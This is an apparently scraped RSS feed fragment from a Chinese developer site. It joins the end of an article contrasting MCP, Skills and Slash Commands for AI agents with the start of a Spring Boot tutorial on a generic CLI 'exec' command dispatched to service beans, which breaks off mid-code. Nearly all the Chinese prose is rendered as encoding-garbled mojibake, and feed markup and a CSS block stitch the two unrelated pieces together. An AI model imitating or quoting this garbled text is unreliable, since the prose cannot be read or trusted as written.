<p><strong>Slash Command</strong> æ˜¯æœ€ç®€å•çš„æ‰©å±•æ–¹å¼â€”â€”æœ¬è´¨ä¸Šæ˜¯å­˜å‚¨çš„æç¤ºè¯ï¼Œç”¨æˆ·è¾“å…¥ <code>/å‘½ä»¤å</code> æ—¶æ³¨å…¥åˆ°å¯¹è¯ä¸­ã€‚</p>
<p><strong>Skill vs Slash Command çš„å…³é”®åŒºåˆ«æ˜¯è§¦å‘æ–¹å¼ï¼š</strong></p>




















<table><thead><tr><th/><th>Slash Command</th><th>Skill</th></tr></thead><tbody><tr><td>è§¦å‘æ–¹å¼</td><td>ç”¨æˆ·æ˜¾å¼è¾“å…¥ <code>/å‘½ä»¤</code></td><td>Claude è‡ªåŠ¨åŒ¹é…</td></tr><tr><td>ç”¨æˆ·æ§åˆ¶</td><td>å®Œå…¨æ§åˆ¶ä½•æ—¶è§¦å‘</td><td>æ— æ³•æ§åˆ¶ï¼ŒClaude å†³å®š</td></tr></tbody></table>
<p>é—®è‡ªå·±ä¸€ä¸ªé—®é¢˜ï¼š<strong>ç”¨æˆ·æ˜¯å¦éœ€è¦æ˜¾å¼æ§åˆ¶è§¦å‘æ—¶æœºï¼Ÿ</strong></p>
<ul>
<li>éœ€è¦ â†’ Slash Command</li>
<li>ä¸éœ€è¦ï¼Œå¸Œæœ› AI è‡ªåŠ¨åˆ¤æ–­ â†’ Skill</li>
</ul>
<h3 data-id="heading-32">æ€»ç»“</h3>
<p>MCP å’Œ Skill æ˜¯ AI Agent æ‰©å±•çš„ä¸¤ç§ä¸åŒå“²å­¦ï¼š</p>






























<table><thead><tr><th/><th>MCP</th><th>Skill</th></tr></thead><tbody><tr><td><strong>å“²å­¦</strong></td><td>è¿æ¥ä¸»ä¹‰</td><td>çŸ¥è¯†æ‰“åŒ…</td></tr><tr><td><strong>é—®çš„é—®é¢˜</strong></td><td>"AI èƒ½è®¿é—®ä»€ä¹ˆï¼Ÿ"</td><td>"AI çŸ¥é“æ€ä¹ˆåšä»€ä¹ˆï¼Ÿ"</td></tr><tr><td><strong>å±‚çº§</strong></td><td>é›†æˆå±‚</td><td>çŸ¥è¯†å±‚</td></tr><tr><td><strong>Token ç­–ç•¥</strong></td><td>é¢„åŠ è½½æ‰€æœ‰èƒ½åŠ›</td><td>æŒ‰éœ€åŠ è½½çŸ¥è¯†</td></tr></tbody></table>
<p>è®°ä½è¿™å¥è¯ï¼š</p>
<blockquote>
<p><strong>MCP connects AI to data; Skills teach AI what to do with that data.</strong></p>
</blockquote>
<p>MCP è®© AI èƒ½"ç¢°åˆ°"æ•°æ®ï¼ŒSkill æ•™ AI æ€ä¹ˆ"å¤„ç†"æ•°æ®ã€‚</p>
<p>å®ƒä»¬ä¸æ˜¯æ›¿ä»£å…³ç³»ï¼Œè€Œæ˜¯äº’è¡¥å…³ç³»ã€‚ä¸€ä¸ªæˆç†Ÿçš„ AI Agent ç³»ç»Ÿï¼Œä¸¤è€…éƒ½éœ€è¦ã€‚</p>
<h3 data-id="heading-33">å‚è€ƒèµ„æº</h3>
<h4 data-id="heading-34">MCP å®˜æ–¹èµ„æº</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">Model Context Protocol å®˜ç½‘</a> - åè®®è§„èŒƒã€å¿«é€Ÿå…¥é—¨ã€Server å¼€å‘æŒ‡å—</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fspec.modelcontextprotocol.io%2F" target="_blank" title="https://spec.modelcontextprotocol.io/" ref="nofollow noopener noreferrer">MCP Specification</a> - å®Œæ•´çš„åè®®è§„èŒƒæ–‡æ¡£</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fmodel-context-protocol" target="_blank" title="https://www.anthropic.com/news/model-context-protocol" ref="nofollow noopener noreferrer">Introducing the Model Context Protocol</a> - Anthropic å‘å¸ƒ MCP çš„å®˜æ–¹åšå®¢</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol" target="_blank" title="https://github.com/modelcontextprotocol" ref="nofollow noopener noreferrer">MCP GitHub Organization</a> - å®˜æ–¹ SDKã€ç¤ºä¾‹ Serverã€å‚è€ƒå®ç°</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpunkpeye%2Fawesome-mcp-servers" target="_blank" title="https://github.com/punkpeye/awesome-mcp-servers" ref="nofollow noopener noreferrer">Awesome MCP Servers</a> - ç¤¾åŒºç»´æŠ¤çš„ MCP Server åˆ—è¡¨</li>
</ul>
<h4 data-id="heading-35">Skill å®˜æ–¹èµ„æº</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code%2Fskills" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code/skills" ref="nofollow noopener noreferrer">Claude Code Skills æ–‡æ¡£</a> - Skills çš„å®Œæ•´æ–‡æ¡£</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fresearch%2Fbuilding-effective-agents" target="_blank" title="https://www.anthropic.com/research/building-effective-agents" ref="nofollow noopener noreferrer">Building effective agents</a> - Anthropic å…³äº Agent è®¾è®¡çš„ç ”ç©¶åšå®¢</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering-guides%2Fcontext-engineering" target="_blank" title="https://www.anthropic.com/engineering-guides/context-engineering" ref="nofollow noopener noreferrer">Context Engineering Guide</a> - ä¸Šä¸‹æ–‡å·¥ç¨‹å®˜æ–¹æŒ‡å—ï¼Œç†è§£ Skill è®¾è®¡å“²å­¦çš„å…³é”®</li>
</ul>
<h4 data-id="heading-36">è·¨å¹³å°é‡‡ç”¨</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fintroducing-the-model-context-protocol%2F" target="_blank" title="https://openai.com/index/introducing-the-model-context-protocol/" ref="nofollow noopener noreferrer">OpenAI adds support for MCP</a> - OpenAI å®£å¸ƒæ”¯æŒ MCP</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.googleblog.com%2Fen%2Fgemini-api-and-ai-studio-now-support-the-model-context-protocol%2F" target="_blank" title="https://developers.googleblog.com/en/gemini-api-and-ai-studio-now-support-the-model-context-protocol/" ref="nofollow noopener noreferrer">Google Gemini MCP Support</a> - Google å®£å¸ƒ Gemini æ”¯æŒ MCP</li>
</ul>
<h4 data-id="heading-37">å»¶ä¼¸é˜…è¯»</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fmodel-context-protocol%23primitives" target="_blank" title="https://www.anthropic.com/news/model-context-protocol#primitives" ref="nofollow noopener noreferrer">Function Calling vs MCP</a> - ç†è§£ä¸¤è€…åŒºåˆ«</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code" ref="nofollow noopener noreferrer">Claude Code Documentation</a> - Claude Code å®Œæ•´æ–‡æ¡£</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fbuild-with-claude%2Fprompt-engineering" target="_blank" title="https://docs.anthropic.com/en/docs/build-with-claude/prompt-engineering" ref="nofollow noopener noreferrer">Prompt Engineering Guide</a> - æç¤ºå·¥ç¨‹åŸºç¡€ï¼ŒContext Engineering çš„å‰ç½®çŸ¥è¯†</li>
</ul>
<hr/>
<p>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« æœ‰å¸®åŠ©ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>ï¼Œä¸‹é¢æ˜¯æˆ‘çš„ä¸€äº›å¼€æºé¡¹ç›®ï¼š</p>
<p><strong>Claude Code Skills</strong>ï¼ˆæŒ‰éœ€åŠ è½½ï¼Œæ„å›¾è‡ªåŠ¨è¯†åˆ«ï¼Œä¸æµªè´¹ tokenï¼Œ<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">ä»‹ç»æ–‡ç« </a>ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - ä»£ç å®¡æŸ¥æŠ€èƒ½ï¼Œè¦†ç›– React 19ã€Vue 3ã€TypeScriptã€Rust ç­‰çº¦ 9000 è¡Œè§„åˆ™ï¼ˆ<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">è¯¦ç»†ä»‹ç»</a>ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys æ ¹å› åˆ†æï¼Œè¯´"æ‰¾æ ¹å› "è‡ªåŠ¨æ¿€æ´»</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - ç¬¬ä¸€æ€§åŸç†æ€è€ƒï¼Œé€‚åˆæ¶æ„è®¾è®¡å’ŒæŠ€æœ¯é€‰å‹</li>
</ul>
<p><strong>å…¨æ ˆé¡¹ç›®</strong>ï¼ˆé€‚åˆå­¦ä¹ ç°ä»£æŠ€æœ¯æ ˆï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt ç®¡ç†å™¨ï¼Œç”¨çš„éƒ½æ˜¯æœ€æ–°çš„æŠ€æœ¯æ ˆï¼Œé€‚åˆç”¨æ¥å­¦ä¹ äº†è§£æœ€æ–°çš„å‰ç«¯å…¨æ ˆå¼€å‘èŒƒå¼ï¼šNext.js 15 + React 19 + tRPC 11 + Supabase å…¨æ ˆç¤ºä¾‹ï¼Œclone ä¸‹æ¥é…ä¸ªå…è´¹ Supabase å°±èƒ½è·‘</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - åŒæ¨¡å¼ AI åº”ç”¨ï¼ˆèŠå¤©+å¯Œæ–‡æœ¬ç¼–è¾‘ï¼‰ï¼ŒVue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot æ‰“é€ é€šç”¨CLIå‘½ä»¤ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7583260493851508777</link>    <guid>https://juejin.cn/post/7583260493851508777</guid>    <pubDate>2025-12-14T23:58:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583260493851508777" data-draft-id="7582637280219037750" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot æ‰“é€ é€šç”¨CLIå‘½ä»¤ç³»ç»Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-14T23:58:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£è±¡å—"/> <meta itemprop="url" content="https://juejin.cn/user/2524134428655159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot æ‰“é€ é€šç”¨CLIå‘½ä»¤ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524134428655159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£è±¡å—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T23:58:43.000Z" title="Sun Dec 14 2025 23:58:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯</h2>
<p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼ŒæŸäº›æƒ…å†µä¸‹å¯èƒ½éœ€è¦ä¸ºæœåŠ¡æä¾›ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼ˆCLIï¼‰ï¼Œæ–¹ä¾¿è¿ç»´ã€è°ƒè¯•æˆ–è€…è¿œç¨‹è°ƒç”¨ä¸šåŠ¡æ¥å£ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª Spring Boot æœåŠ¡ï¼Œæä¾›å¤šä¸ªæ¥å£ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>è·å–ç”¨æˆ·åˆ—è¡¨ï¼š<code>/users?type=admin</code></li>
<li>è·å–è§’è‰²åˆ—è¡¨ï¼š<code>/roles?level=manager</code></li>
<li>è·å–ç³»ç»ŸçŠ¶æ€ï¼š<code>/system/status</code></li>
<li>æ‰¹é‡å¯¼å…¥æ•°æ®ï¼š<code>/data/import</code></li>
<li>ç”ŸæˆæŠ¥è¡¨ï¼š<code>/report/generate</code></li>
</ul>
<p>ä¼ ç»Ÿåšæ³•ï¼š</p>
<ul>
<li>æ¯ä¸ªæ¥å£åœ¨ CLI å®¢æˆ·ç«¯å†™ä¸€æ¡å‘½ä»¤</li>
<li>CLI æ–¹æ³•ç›´æ¥è°ƒç”¨æœåŠ¡ç«¯ REST æ¥å£</li>
<li>ç¡¬ç¼–ç çš„æœåŠ¡åœ°å€å’Œå‚æ•°æ ¼å¼</li>
</ul>
<p><strong>é—®é¢˜</strong>ï¼š</p>
<ul>
<li>æ¥å£å¤šæ—¶ï¼ŒCLI æ–¹æ³•æ•°é‡æ¿€å¢ï¼Œä»£ç å†—ä½™ä¸¥é‡</li>
<li>æ¯æ¬¡æ–°å¢æ¥å£éƒ½éœ€è¦ä¿®æ”¹å®¢æˆ·ç«¯ï¼Œå‘å¸ƒæ–°ç‰ˆæœ¬</li>
<li>ç»´æŠ¤æˆæœ¬é«˜ï¼Œä¸åŒç¯å¢ƒçš„é…ç½®åˆ†æ•£</li>
<li>ç¼ºä¹ç»Ÿä¸€çš„è®¤è¯ã€æˆæƒå’Œæ—¥å¿—æœºåˆ¶</li>
<li>å¼€å‘æ•ˆç‡ä½ä¸‹ï¼Œé‡å¤åŠ³åŠ¨å¤š</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<strong>é€šç”¨å‘½ä»¤ + åŠ¨æ€åˆ†å‘</strong></p>
<ul>
<li>CLI åªç»´æŠ¤ä¸€æ¡é€šç”¨å‘½ä»¤ <code>exec</code></li>
<li>æ ¹æ®å‚æ•°åŠ¨æ€è·¯ç”±åˆ°æœåŠ¡ç«¯å¯¹åº”çš„ Service Bean</li>
<li>æœåŠ¡ç«¯ç»Ÿä¸€ç®¡ç†ï¼Œæ”¯æŒåŠ¨æ€æ‰©å±•</li>
<li>ä¸€æ¬¡å¼€å‘ï¼Œå¤šå¤„å¤ç”¨</li>
</ul>
<h2 data-id="heading-1">äºŒã€æ–¹æ¡ˆè®¾è®¡</h2>
<h4 data-id="heading-2">1. æ ¸å¿ƒæ¶æ„</h4>
<p>æˆ‘ä»¬è®¾è®¡äº†ä¸€å¥—åŸºäº Spring Boot + Spring Shell çš„é€šç”¨CLIç³»ç»Ÿï¼Œé‡‡ç”¨åˆ†å±‚æ¶æ„è®¾è®¡ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">å®¢æˆ·ç«¯(Spring Shell)  &lt;<span class="hljs-attr">--HTTP--</span>&gt;  æœåŠ¡ç«¯(Spring Boot)
       |                              |
    é€šç”¨å‘½ä»¤exec                    ç»Ÿä¸€æ§åˆ¶å™¨(/cli)
       |                              |
    åŠ¨æ€å‚æ•°                      åŠ¨æ€Beanåˆ†å‘
       |                              |
  å•ä¸€å…¥å£å‘½ä»¤                  å¤šä¸ªCommandHandler
       |                              |
    <span class="hljs-attribute">REST</span>é€šä¿¡                    ä¸šåŠ¡é€»è¾‘å¤„ç†
</code></pre>
<p><strong>è®¾è®¡åŸåˆ™</strong></p>
<p><strong>å•ä¸€èŒè´£</strong>ï¼šå®¢æˆ·ç«¯åªè´Ÿè´£å‘½ä»¤è§£æå’ŒHTTPé€šä¿¡ï¼ŒæœåŠ¡ç«¯åªè´Ÿè´£ä¸šåŠ¡é€»è¾‘
<strong>å¼€é—­åŸåˆ™</strong>ï¼šå¯¹æ‰©å±•å¼€æ”¾ï¼ˆæ–°å¢æœåŠ¡ï¼‰ï¼Œå¯¹ä¿®æ”¹å…³é—­ï¼ˆä¸éœ€æ”¹å®¢æˆ·ç«¯ï¼‰
<strong>ä¾èµ–å€’ç½®</strong>ï¼šä¾èµ–æŠ½è±¡çš„CommandHandleræ¥å£ï¼Œè€Œéå…·ä½“å®ç°
<strong>æœ€å°çŸ¥è¯†</strong>ï¼šå®¢æˆ·ç«¯æ— éœ€çŸ¥é“æœåŠ¡ç«¯çš„å…·ä½“å®ç°ç»†èŠ‚</p>
<h4 data-id="heading-3">2. å®¢æˆ·ç«¯è®¾è®¡</h4>
<p>åœ¨ CLI å®¢æˆ·ç«¯å®šä¹‰ä¸€æ¡é€šç”¨å‘½ä»¤ <code>exec</code>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ShellComponent</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecCommand</span> {

    <span class="hljs-meta">@ShellMethod(key = "exec", value = "æ‰§è¡Œè¿œç¨‹æœåŠ¡å‘½ä»¤")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(
            <span class="hljs-meta">@ShellOption(value = {"", "service"}, help = "æœåŠ¡åç§°")</span> String serviceName,
            <span class="hljs-meta">@ShellOption(value = "--args", help = "å‘½ä»¤å‚æ•°", arity = 100)</span> String[] args)</span> {

        <span class="hljs-comment">// æ„å»ºè¯·æ±‚å¹¶å‘é€åˆ°æœåŠ¡ç«¯</span>
        <span class="hljs-type">CommandRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommandRequest</span>(serviceName, Arrays.asList(args));
        <span class="hljs-keyword">return</span> httpClient.post(<span class="hljs-string">"/cli"</span>, request);
    }
}
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> userService --args list</span>
user1, user2, user3
<span class="hljs-meta prompt_">
&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> roleService --args <span class="hljs-built_in">users</span> admin</span>
role1, role2
<span class="hljs-meta prompt_">
&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> systemService --args status</span>
ç³»ç»Ÿæ­£å¸¸è¿è¡Œ
</code></pre>
<h4 data-id="heading-4">3. æœåŠ¡ç«¯è®¾è®¡</h4>
<p>æœåŠ¡ç«¯æä¾›ç»Ÿä¸€æ¥å£ <code>/cli</code>ï¼Œæ ¹æ®æœåŠ¡ååŠ¨æ€åˆ†å‘ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/cli")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CliController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ApplicationContext applicationContext;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CommandRequest request)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">serviceName</span> <span class="hljs-operator">=</span> request.getService();
        String[] args = request.getArgs().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]);

        <span class="hljs-comment">// åŠ¨æ€è·å– Service Bean</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">serviceBean</span> <span class="hljs-operator">=</span> applicationContext.getBean(serviceName);

        <span class="hljs-comment">// æ‰§è¡Œå‘½ä»¤</span>
        <span class="hljs-keyword">if</span> (serviceBean <span class="hljs-keyword">instanceof</span> CommandHandler handler) {
            <span class="hljs-keyword">return</span> handler.handle(args);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-string">"æœåŠ¡æœªæ‰¾åˆ°"</span>;
    }
}
</code></pre>
<h4 data-id="heading-5">4. ç»Ÿä¸€æ¥å£è§„èŒƒ</h4>
<p>æ‰€æœ‰éœ€è¦é€šè¿‡CLIè°ƒç”¨çš„æœåŠ¡éƒ½å¿…é¡»å®ç° <code>CommandHandler</code> æ¥å£ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CommandHandler</span> {
    String <span class="hljs-title function_">handle</span><span class="hljs-params">(String[] args)</span>;
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"å‘½ä»¤æè¿°"</span>; }
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getUsage</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"ä½¿ç”¨è¯´æ˜"</span>; }
}
</code></pre>
<p>ç¤ºä¾‹æœåŠ¡å®ç°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("userService")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CommandHandler</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">if</span> (args.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> getUsage();

        <span class="hljs-keyword">switch</span> (args[<span class="hljs-number">0</span>]) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">"list"</span>:
                <span class="hljs-keyword">return</span> listUsers(args.length &gt; <span class="hljs-number">1</span> ? args[<span class="hljs-number">1</span>] : <span class="hljs-literal">null</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-string">"get"</span>:
                <span class="hljs-keyword">return</span> getUser(args[<span class="hljs-number">1</span>]);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"æœªçŸ¥å‘½ä»¤: "</span> + args[<span class="hljs-number">0</span>];
        }
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">listUsers</span><span class="hljs-params">(String type)</span> {
